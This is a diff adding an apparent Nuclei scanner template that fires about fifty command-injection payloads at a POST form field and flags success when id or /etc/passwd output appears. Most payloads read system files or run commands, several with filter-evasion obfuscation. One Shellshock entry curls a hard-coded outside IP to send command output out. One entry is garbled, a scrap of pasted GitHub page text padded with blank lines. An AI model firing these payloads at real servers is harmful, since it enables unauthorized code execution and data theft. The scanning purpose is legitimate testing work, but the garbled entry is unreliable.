@@ -1,0 +1,139 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "cat$u /etc/passwd"
+        - "<id"
+        - ";id"
+        - "a);id"
+        - "%26id%26"
+        - "%7Ccat%20%2Fetc%24%7BIFS%7Dpasswd"
+        - ";id|"
+        - "%0a id"
+        - ";`id` # RCE payload"
+        - "%26%20cat%2520%2Fetc%24Fpasswd%24F"
+        - "||id"
+        - "&&cat /e${IFS}tc/${IFS}/passw${IFS}d"
+        - "%28id%29"
+        - "||id|"
+        - "| id"
+        - ";id"
+        - ";id\\n"
+        - ";system('id')"
+        - ";id"
+        - "cat /etc/passwd"
+        - "%7Ccat+/etc/passwd"
+        - "%26id"
+        - ";id"
+        - "\\nid;"
+        - "%24%28id"
+        - ";cat+/etc/passwd"
+        - ";id"
+        - "%26%26id"
+        - "&&id"
+        - "id;id;id;"
+        - "cat$u /e${hahaha}tc/${heywaf}pas${catchthis}swd"
+        - "id|whoami"
+        - "&&cat+/etc/passwd"
+        - "%2Bcat%24u%20%2Fetc%2Fpasswd"
+        - "<?php system(\"id\"); ?>"
+        - "%26cat%24IFS/etc/passwd"
+        - "%27id%27"
+        - "system('cat /etc/passwd');"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=10?rce=\\`id\\`\""
+        - "cat /etc/passwd"
+        - "id;"
+        - "id&;cat+/etc/passwd"
+        - ";system(\"cat$u /etc$u/passwd$u\")"
+        - "a%22i%27d"
+        - "id"
+        - "%26cat%20/etc/passwd"
+        - ";cat$u /etc$u/passwd$u"
+        - "%24%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "command-injection-payload-list/README.md at master · payloadbox/command-injection-payload-list · GitHub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Skip to content Trilogy RCE Payload List By Haxxer (c) 2021"
+        - "%2Aid%2B"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
